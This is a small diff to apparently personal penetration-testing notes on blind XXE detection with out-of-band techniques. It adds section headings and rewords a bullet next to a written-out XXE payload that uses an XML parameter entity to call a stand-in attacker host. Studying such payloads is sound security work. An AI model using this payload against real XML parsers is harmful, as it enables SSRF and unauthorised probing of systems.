@@ -41,10 +41,14 @@
 
 ### Out-of-band (OAST) techniques <a href="#detecting-blind-xxe-using-out-of-band-oast-techniques" id="detecting-blind-xxe-using-out-of-band-oast-techniques"></a>
 
+**Detection**
+
 * Detecting as SSRF
-* Bypass via XML parameter entities
+* Regular entities are blocked? Bypass via XML parameter entities
   * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>`
   * This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD
+
+**Exploitation**
 
 ## Finding hidden attack surface for XXE injection
 
